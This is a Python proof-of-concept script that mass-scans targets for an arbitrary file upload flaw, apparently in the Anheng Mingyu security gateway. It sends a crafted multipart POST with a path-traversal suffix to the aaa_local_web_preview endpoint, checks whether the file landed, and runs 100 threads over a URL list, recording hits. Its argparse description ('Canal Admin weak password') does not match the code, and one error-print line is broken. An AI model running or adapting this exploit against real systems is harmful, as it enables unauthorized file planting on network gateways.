import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    banner()
    parser = argparse.ArgumentParser(description="Canal Admin weak password")
    parser.add_argument('-u','--url',help='Please input your attack url')
    parser.add_argument('-f','--file',help='Please input your attack file')
    args = parser.parse_args()
    
    if args.url and not args.file :
            poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('/n',''))
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
            print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def banner():
    test="""
     █████                      ██████   ██████
    ░░███                      ░░██████ ██████
     ░███        ██████   ██████░███░█████░███
     ░███       ░░░░░███ ███░░██░███░░███ ░███
     ░███        ███████░███ ░██░███ ░░░  ░███
     ░███      ████░░███░███ ░██░███      ░███
     ██████████░░███████░░███████████     █████
"""
    print(test)
    # 漏洞检测poc模块
def poc(target):
    url = target + '/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test12332.txt'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type':'multipart/form-data;boundary=849978f98abe41119122148e4aa65b1a',
        'Accept-Encoding': 'gzip',
        'Content-Length': '176'
    }
    data = '''--849978f98abe41119122148e4aa65b1a\r\nContent-Disposition: form-data; name="123"; filename="test12332.txt"\r\nContent-Type: text/plain\r\n\r\nmmp112\r\n--849978f98abe41119122148e4aa65b1a--'''
    url2= target+'/test12332.txt'
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5).text
        res2=requests.get(url=url2,verify=False).status_code
        if res2 == 200:
              with open(r'E:\Learning file\pythonxuexi\poc\poc1\kaoshi\安恒明御安全网关aaa_local_web_preview文件上传漏洞\data.txt','a+') as f1:
                   f1.write(f'{target}\n')
                   print('[+++++++]'+target+'存在文件上传漏洞')
        else:
             print('[-]'+{target}+'不存在文件上传漏洞')
    except:
         print(f'[*]{target}'' is server error')

if __name__ == '__main__' :
    main()